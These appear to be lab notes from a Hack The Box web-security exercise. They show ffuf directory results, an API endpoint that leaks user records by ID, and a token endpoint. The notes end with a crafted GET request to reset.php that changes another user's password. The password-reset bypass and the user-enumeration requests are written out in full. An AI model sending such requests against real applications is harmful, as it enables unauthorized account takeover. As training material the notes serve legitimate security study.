# FFUF results
api.php                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 115ms]
event.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 29ms]
index.php               [Status: 200, Size: 2386, Words: 418, Lines: 56, Duration: 32ms]
profile.php             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
reset.php               [Status: 200, Size: 18, Words: 2, Lines: 1, Duration: 29ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 27ms]
settings.php            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 34ms]

# User
## Makes a GET request. Output is in json
- GET /api.php/user/74 HTTP/1.1
- {"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}

# Reset password
## First it makes a GET request
GET /api.php/token/74 HTTP/1.1

> [!INFO] I assume it is for receiving a token

## Then it makes a POST request
POST /reset.php HTTP/1.1

uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=test


# Script

- No such user admin
- We can change other user's password by using a GET method instead of POST
    - Eg.
    ```http
    GET /reset.php?uid=1&token=e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c&password=test HTTP/1.1
    ```
    - But do we have a high value target?

